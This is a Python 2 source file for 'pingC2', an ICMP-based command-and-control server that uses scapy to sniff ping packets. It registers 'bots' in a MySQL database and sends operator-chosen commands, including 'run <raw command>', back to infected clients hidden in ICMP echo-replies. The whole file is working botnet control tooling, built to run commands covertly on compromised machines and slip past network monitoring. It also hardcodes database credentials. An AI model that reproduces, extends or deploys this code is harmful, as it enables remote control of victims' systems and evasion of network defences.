#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

from multiprocessing import *
from datetime import date
import threading
import MySQLdb
import ctypes
import sys
import signal
from scapy.all import *

#def updateCommand():
#	return command

def displayBots():
	print "[*] Displaying bots!"
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	print '{0: <20}'.format('RemoteIP'),'{0: <20}'.format('LocalIP'),'{0: <20}'.format('Name'),'{0: <20}'.format('OS'),'{0: <20}'.format('Checkin date')
	print "--------------------------------------------------------------------------------------------------"
	cur.execute("select remoteip,localip,name,os,checkin from bots")
        for row in cur.fetchall():
        	print '{0: <20}'.format(row[0]),'{0: <20}'.format(row[1]),'{0: <20}'.format(row[2]),'{0: <20}'.format(row[3]),row[4]
	db.close()

def updateBotSysinfo(botId,remoteIP,name,os):
	print "[*] Updating bot info"
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	try:
		cur.execute("update bots set remoteip=%s,name=%s,os=%s where id=%s",(remoteIP,name,os,botId))
	except Exception,e:
		print "[X] " + str(e)
		return False
	db.commit()
	print "[*] Bot info updated"
	db.close()
	return True

def doesBotExist(botId):
	print "[*] Checking bot existence"
        db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	query = "select * from bots where id=%i" % botId
        #print "[D] Query: "+query
        cur.execute(query)
        if cur.fetchall():
                print "[*] Bot ID exists"
		db.close()
		return True
	else:
		db.close()
		return False


def addBot(srcIP,name,os):
	print "[*] Adding bot"
	botId=0
	try:
		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
		cur = db.cursor()
		cur.execute("select max(id) from bots")
		row = cur.fetchone()
		if row[0]:
			botId=int(row[0]) + 1
			print "[*] Adding bot number %s!" % botId
		else:
			botId=1
			print "[*} Adding first bot to PingC2!"
		cur.execute("""insert into bots (remoteip,name,os,checkin) values(%s,%s,%s,%s)""",(srcIP,name,os,date.today()))
                db.commit()
        except Exception,e:
        	print "[X] Error: " + str(e)
	print "[*] Bot ID(%s) added!" % botId
	db.close()
	return botId	

def displayMenu():
	listener = False
	print "\nChoose an option"
        #print "[D] Debug: ", active_children()
	#print len(active_children())
	for proc in active_children():
		if (proc.name == 'C2Listener'):
			listener = True;
        if listener == False:
		print "1) Start C2 listener"
	print "2) Display bots"
        print "3) Change bot command ('l' to list commands)"
        print "4) Stop C2 listener"
	print "q) Quit"

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'
	sys.exit()

# Command and Control main function
def c2main(command):
	print ""
        print "[*] Command received from C2: %s" % command.value
	while True:
		logfile_error = open('errors.log','w')
		conf.verb = 0
        	count = 1
        	filter = "icmp"
		packet = sniff(count,filter=filter)
		for p in packet:
        		#p.show2()
                	try:
                		request = p['Raw'].load
                        	ip_id = p['IP'].id
                       		icmp_id = p['ICMP'].id
                       		print "[*] Request: " + request
				if 'What shall I do master?' in request:
					botId = int(request[24:])
					if doesBotExist(botId):
						print "[*] Bot ID exists, sending command"
                                                resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
                                                #resp.show2()
                                                send(resp)
                                                print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
                                                print "Option: "
                                        else:
                                        	print "[*] Client not registered"
                        	# Checkin function
				elif 'Checkin' in request:
					# Build checkin database and info to capture
					print "\n[*] %s checking in" % p['IP'].src
					checkinInfo = request[8:].split()
                                        botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
					sendId = "id="+str(botId)
					#print "[D] SendId: ",sendId
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                        #resp.show2()
                                        send(resp)
                                        print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
                                        print "Option: "
				elif 'sysinfo' in request:
					# Build sysinfo capture system database
                        		#print "[D] Inside sysinfo"
					sysinfo = request[8:].split()					
					#print "[D] Id: " + sysinfo[0]
                                	print "\n[*] Received sysinfo from client: %s" % sysinfo
					if doesBotExist(int(sysinfo[0])):
						updateBotSysinfo(int(sysinfo[0]),p['IP'].src,sysinfo[2],sysinfo[1])
                                               	print "[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[0],p['IP'].src)
					else:
						print "[*] Machine does not exist, ignoring"
	
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                	#resp.show2()
                                	print "\n[*] Response sent: Thanks"
                                	send(resp)
                        		print "Option: "
				else:   
                                        print "[**] Client not recognized"
                	except:
				error = "[X] ERROR: " + str(sys.exc_info()[0])
                        	logfile_error.write(error)

def main(argv):
	print "	--------------------------------------------"
	print "	  _____    _                    _____   ___  "
 	print "	 |  __ \  (_)                  / ____| |__ \ "
 	print "	 | |__) |  _   _ __     __ _  | |         ) |"
 	print "	 |  ___/  | | | '_ \   / _` | | |        / / "
 	print "	 | |      | | | | | | | (_| | | |____   / /_ "
 	print "	 |_|      |_| |_| |_|  \__, |  \_____| |____|"
        print "        		        _/ |                "
        print "	 		      |___/		    "
        print "	 					    "
	print "	 		Command Center              "
	print "	 		   by NoCow		    "
	print "	--------------------------------------------"
	manager = Manager()
	command = manager.Namespace()
	command.value = 'sysinfo'
	#print "[*] Command: %s" % command.value
	process = Process(name='C2Listener',target=c2main,args=(command,))
	displayMenu()
	while True:
		signal.signal(signal.SIGINT, handler)
		#displayMenu()
		try:
			option = raw_input("Option: ")
		except Exception,e:
			print "[X] Error: " + str(e)
		#print "[D] Option chosen: ",option
		if option == '1':
			command.value = 'sysinfo'
			if (len(active_children()) > 1):
				print "[*] Capture running. Stopping first."
				for proc in active_children():
					if proc.name != 'SyncManager-1':		
						#print "[D] Killing process: ", proc.name
						proc.terminate()
				print "[*] Starting new capture"
				process = Process(name='C2Listener',target=c2main,args=(command,))
				process.start()
				if process.is_alive():
					print "[*] C2 Listening - command: %s" % command.value
				else:
					print "[X] Error starting C2 listener"
			else:
				print "[*] No listener currently running. Starting..."
				process = Process(name='C2Listener',target=c2main,args=(command,))
				process.start()
				if process.is_alive():
					print "[*] C2 Listening - command: %s" % command.value
				else:
					print "[X] Error starting C2 listener"
		elif option == '2':
			print "[*] Displaying bots!"
			displayBots()
		elif option == '3':
                        if process.is_alive():
                        	command.value = raw_input("Enter a command: ")
				print "[*] C2 Listening - command: %s" % command.value
                        else:
                                print "[X] C2 listener not running. Please start listener first"
		elif option == '4':
			for proc in active_children():
				if proc.name == 'C2Listener':
					proc.terminate()
		elif option == 'l':
			print "\n Available commands: run <raw command>, sleep <seconds>, sysinfo"
		# Hidden debug option - display relevant info
		elif option == 'd':
			print "[D] Running Processes: ", active_children()
		elif option == 'q':
			for proc in active_children():
				proc.terminate()
			sys.exit()
		else:
			print "Invalid Option...please try again"

if __name__ == "__main__":
   main(sys.argv[1:])
